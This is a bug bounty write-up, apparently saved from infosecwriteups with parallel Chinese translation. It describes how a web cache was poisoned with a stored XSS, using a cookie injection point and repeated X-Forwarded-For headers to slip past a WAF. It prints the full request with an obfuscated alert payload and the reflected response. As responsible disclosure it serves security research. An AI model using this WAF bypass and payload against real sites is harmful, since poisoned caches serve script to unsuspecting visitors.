<DIV class="gs gr hl hm hn" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="ab ce" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<H1 id=f11c class="pw-post-title ho hp hq bf hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-testid="storyTitle" data-selectable-paragraph="" data-immersive-translate-paragraph="1">How I Made $16,500 Hacking CDN Caching Servers &#8212; Part 2 
<P><SPAN class=headers>Title:</SPAN></B><SPAN class=RefText> &#25105;&#26159;&#22914;&#20309;&#36890;&#36807;&#20837;&#20405; CDN &#32531;&#23384;&#26381;&#21153;&#22120;&#36186;&#21462;16,500&#32654;&#20803;&#30340; &#8212; &#31532;2&#37096;&#20998;</SPAN></FONT></P>
<P><SPAN class=headers><SPAN class=headers>Author:</SPAN></B><SPAN class=RefText> bxmbn</SPAN></FONT></SPAN></FONT></P>
<P><A href="https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6"><SPAN class=headers>Link:</SPAN></B><SPAN class=RefText> https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6</SPAN></FONT></A></P>
<P><SPAN class=headers>Source:</SPAN></B><SPAN class=RefText> infosec writeups</SPAN></FONT></P>
<P>&nbsp;</P></H1></DIV>
<DIV class="ab ce" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e"><FIGURE class="nx ny nz oa ob oc nu nv paragraph-image" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="nu nv nw" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e"><PICTURE data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e"><img role=presentation class="bh es od c" alt="" src="https://miro.medium.com/v2/resize:fit:610/1*pyZEcnS5fLESc8yUS4wbdA.png" width=610 height=372 data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" loading="eager" data-cubox-image-id="70f3e5fa315f82ff4d4902eb8f7488a5" data-cubox-image-index="4" data-cubox-image-load="false"></PICTURE></DIV></FIGURE></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="ab ce" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<H1 id=5117 class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">A Nice Way To Hide XSS 
<P>&#38544;&#34255; XSS &#30340;&#24039;&#22937;&#26041;&#27861;</H1>
<BLOCKQUOTE class="pf pg ph" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<P id=f888 class="pi pj pk pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph=""><EM class=hq data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-immersive-translate-paragraph="1">Bounty: $2,000&nbsp;&nbsp;&#28431;&#27934;&#36175;&#37329;&#65306;2000 &#32654;&#20803;</EM></P></BLOCKQUOTE>
<P id=2947 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">While Google Dorking, i found a particular URL, but this time, was not being cached, but if i added an cacheable extension file (.js , .css) at the end of URL, it would cache the response. 
<P>&#22312;&#20351;&#29992;&#35895;&#27468;&#25628;&#32034;&#35821;&#27861;&#26102;&#65292;&#25105;&#21457;&#29616;&#20102;&#19968;&#20010;&#29305;&#27530; URL&#12290;&#34429;&#28982;&#35813; URL &#26412;&#36523;&#26410;&#34987;&#32531;&#23384;&#65292;&#20294;&#33509;&#22312;&#26411;&#23614;&#28155;&#21152;&#21487;&#32531;&#23384;&#25193;&#23637;&#25991;&#20214;&#65288;&#22914;.js&#12289;.css&#65289;&#65292;&#26381;&#21153;&#22120;&#20415;&#20250;&#32531;&#23384;&#21709;&#24212;&#20869;&#23481;&#12290;</P>
<P id=3f09 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Now, all i needed was to found a XSS. I found an injection point on a Cookie, but WAF would trigger when i added anything after %20 
<P>&#25509;&#19979;&#26469;&#21482;&#38656;&#25214;&#21040; XSS &#28431;&#27934;&#21363;&#21487;&#12290;&#25105;&#22312; Cookie &#22788;&#21457;&#29616;&#20102;&#27880;&#20837;&#28857;&#65292;&#20294;&#27599;&#24403;&#22312;%20 &#21518;&#28155;&#21152;&#20869;&#23481;&#26102;&#65292;Web &#24212;&#29992;&#38450;&#28779;&#22681;(WAF)&#23601;&#20250;&#35302;&#21457;&#25318;&#25130;&#12290;</P><PRE class="nx ny nz oa ob qc qd qe qf ay qg bk"><SPAN id=d2a7 class="qh om hq qd b fx qi qj l ka qk" data-selectable-paragraph="">Cookie: cookiename=xss&lt;/script%20</SPAN></PRE>
<P id=dc06 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">While trying to bypass the WAF, I realized that my IP was also being reflected on that same script.. 
<P>&#22312;&#23581;&#35797;&#32469;&#36807; WAF &#26102;&#65292;&#25105;&#21457;&#29616;&#33258;&#24049; IP &#22320;&#22336;&#20063;&#34987;&#21516;&#19968;&#33050;&#26412;&#21453;&#23556;&#20102;&#20986;&#26469;&#12290;</P><PRE class="nx ny nz oa ob qc qd qe qf ay qg bk"><SPAN id=396c class="qh om hq qd b fx qi qj l ka qk" data-selectable-paragraph="">guid="&lt;/script ","24.99.19.20"</SPAN></PRE>
<P id=67e7 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Since my IP was being reflected, I tried &#8220;X-Forwarded-For&#8221; Headers, this way i can close the &lt;script&gt; and avoid WAF, as it would trigger if it detected &lt;[anything]&gt; 
<P>&#37492;&#20110; IP &#22320;&#22336;&#20250;&#34987;&#21453;&#23556;&#65292;&#25105;&#23581;&#35797;&#20351;&#29992;"X-Forwarded-For"&#35831;&#27714;&#22836;&#38381;&#21512;</P>
<P id=f2fa class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">This is why you will see 3 &#8220;X-Forwarded-For&#8221; Headers 
<P>&#36825;&#23601;&#26159;&#35831;&#27714;&#20013;&#20250;&#23384;&#22312; 3 &#20010;"X-Forwarded-For"&#35831;&#27714;&#22836;&#30340;&#21407;&#22240;</P>
<H2 id=f9ff class="qh om hq bf on fg ql fh fi fj qm fk fl fm qn fn fo fp qo fq fr fs qp ft fu qq bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Request:&nbsp;&nbsp;&#35831;&#27714;&#31034;&#20363;&#65306;</H2><PRE class="nx ny nz oa ob qc qd qe qf ay qg bk"><SPAN id=de99 class="qh om hq qd b fx qi qj l ka qk" data-selectable-paragraph="">GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2 <P>Host: Redacted<P>X-Forwarded-For: xss <P>X-Forwarded-For: xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: &gt; <P>Cookie: gdId=xss&lt;/script%20</SPAN></P></PRE>
<H2 id=a5bc class="qh om hq bf on fg ql fh fi fj qm fk fl fm qn fn fo fp qo fq fr fs qp ft fu qq bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Response:&nbsp;&nbsp;&#21709;&#24212;&#65306;</H2><PRE class="nx ny nz oa ob qc qd qe qf ay qg bk"><SPAN id=c6a2 class="qh om hq qd b fx qi qj l ka qk" data-selectable-paragraph="">...<P>guid="&lt;/script ","24.99.19.20","xss","xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`//,"&gt;<P>...</SPAN></P></PRE>
<P id=9d4a class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">After Poisoned an URL with an XSS, an attacker just needed to send it to the victim 
<P>&#36890;&#36807; XSS &#23545;&#26576;&#20010; URL &#36827;&#34892;&#25237;&#27602;&#21518;&#65292;&#25915;&#20987;&#32773;&#21482;&#38656;&#23558;&#20854;&#21457;&#36865;&#32473;&#21463;&#23475;&#32773;</P><PRE class="nx ny nz oa ob qc qd qe qf ay qg bk"><SPAN id=5f0b class="qh om hq qd b fx qi qj l ka qk" data-selectable-paragraph=""><MARK class="zm zn ap">redacted.com/xxx/xx/xxx.xx/x.js?t=2021111121</MARK></SPAN></PRE>
<P id=0649 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">A nice way to hide XSS :D 
<P>&#38544;&#34255; XSS &#30340;&#32477;&#20339;&#26041;&#27861; :D</P>
<P id=bc0a class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">This was my favorite Cache Poisoning, and it was found on a Public Program 
<P>&#36825;&#26159;&#25105;&#26368;&#38047;&#29233;&#30340;&#32531;&#23384;&#25237;&#27602;&#25163;&#27861;&#65292;&#21457;&#29616;&#20110;&#26576;&#20844;&#24320;&#28431;&#27934;&#20247;&#27979;&#39033;&#30446;</P>
<P id=90a9 class="pw-post-body-paragraph pi pj hq pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph=""><A class="ag gq" href="https://hackerone.com/reports/1424094" rel="noopener ugc nofollow" target=_blank data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">https://hackerone.com/reports/1424094</A></P></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="ab ce" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<H1 id=68f2 class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Timeline:&nbsp;&nbsp;&#26102;&#38388;&#32447;&#65306;</H1>
<BLOCKQUOTE class="pf pg ph" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<P id=2701 class="pi pj pk pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Reported &#8594; December 11, 2021 
<P>&#25253;&#21578;&#26102;&#38388; &#8594; 2021 &#24180; 12 &#26376; 11 &#26085;</P>
<P id=da0a class="pi pj pk pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Triaged &#8594; December 14, 2021 
<P>&#20998;&#31867;&#22788;&#29702; &#8594; 2021 &#24180; 12 &#26376; 14 &#26085;</P>
<P id=0068 class="pi pj pk pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Bounty Awarded &#8594; January 7, 2022 
<P>&#22870;&#37329;&#21457;&#25918; &#8594; 2022 &#24180; 1 &#26376; 7 &#26085;</P>
<P id=e1bc class="pi pj pk pl b io pm pn po ir pp pq pr fm ps pt pu fp pv pw px fs py pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Fixed &#8594; March 7, 2022 
<P>&#20462;&#22797;&#26102;&#38388; &#8594; 2022 &#24180; 3 &#26376; 7 &#26085;</P></BLOCKQUOTE></DIV></DIV></DIV>
<DIV class="gs gr hl hm hn" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="ab ce" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<DIV class="cl bh gy gz ha hb" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e">
<H1 id=683f class="ol om hq bf on oo op iq fi oq or it fl os ot ou ov ow ox oy oz pa pb pc pd pe bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Next:&nbsp;&nbsp;&#19979;&#19968;&#27493;&#65306;</H1>
<P id=6acb class="pw-post-body-paragraph pi pj hq pl b io qr pn po ir qs pq pr fm qt pt pu fp qu pw px fs qv pz qa qb gs bk" data-immersive-translate-walked="67df56f7-1d06-4847-a505-b110d562481e" data-selectable-paragraph="" data-immersive-translate-paragraph="1">Part 3: Cache Poisoning DoS Via X-Forwarded-Scheme Header 
<P>&#31532;&#19977;&#37096;&#20998;&#65306;&#36890;&#36807; X-Forwarded-Scheme &#26631;&#22836;&#23454;&#29616;&#32531;&#23384;&#25237;&#27602;&#25298;&#32477;&#26381;&#21153;&#25915;&#20987;